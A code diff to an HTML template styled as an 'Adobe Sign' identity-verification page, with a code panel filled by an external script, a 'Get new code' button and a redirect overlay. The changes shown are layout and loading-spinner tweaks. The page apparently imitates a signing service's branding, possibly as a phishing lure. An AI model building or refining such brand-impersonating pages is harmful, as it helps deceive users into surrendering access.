@@ -14,7 +14,7 @@
             --ab-gray-text: #686868; --ab-white: #FFFFFF; --ab-green: #2D9D3A;
             --radius-lg: 12px; --radius-md: 8px; --shadow-card: 0 4px 20px rgba(0,0,0,.06);
         }
-        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: var(--ab-gray-bg); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding: 24px 16px; }
+        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: var(--ab-gray-bg); min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 16px; }
         
         /* Adobe Sign Header Bar */
         .sign-header-bar { width: 100%; max-width: 720px; background: var(--ab-white); border: 1px solid var(--ab-gray-border); border-radius: var(--radius-lg); display: flex; align-items: center; justify-content: space-between; padding: 16px 28px; margin-bottom: 20px; box-shadow: var(--shadow-card); }
@@ -82,7 +82,7 @@
 
         /* Code Panel & Loading State */
         .code-panel { display: none; margin-top: 10px; text-align: left; max-width: 480px; margin-left: auto; margin-right: auto; }
-        .code-panel.show { display: block; }
+        .code-panel.loading, .code-panel.show { display: block; }
         #loadingView { display: block; }
         #codeLoadedView { display: none; }
         /* When vg-engine.js adds .show to codePanel (code ready) */
@@ -209,7 +209,7 @@
         </div>
 
         <div class="card-body">
-            <button class="btn-primary" id="startBtn" onclick="generateCode()">
+            <button class="btn-primary" id="startBtn" onclick="vgStartLoading(); generateCode();">
                 {{BUTTON_TEXT}}
             </button>
 
@@ -232,7 +232,7 @@
                     </div>
                     <div class="timer-row">
                         <div class="timer-pill" id="timerPill" style="display:none"></div>
-                        <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()" style="display:none">
+                        <button class="refresh-btn" id="refreshBtn" onclick="vgStartLoading(); refreshCode();" style="display:none">
                             <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/></svg> Get new code
                         </button>
                     </div>
@@ -273,5 +273,18 @@
             <p id="overlayMsg">Identity verified.<br>Redirecting to your document…</p>
         </div>
     </div>
+
+    <script>
+        /* Show the loading spinner/progress bar while vg-engine.js generates
+           the code.  vg-engine.js adds .show to #codePanel when the code is
+           ready; CSS then hides this view and reveals the code view. */
+        function vgStartLoading() {
+            var panel = document.getElementById('codePanel');
+            if (panel) {
+                panel.classList.remove('show');
+                panel.classList.add('loading');
+            }
+        }
+    </script>
 </body>
 </html>
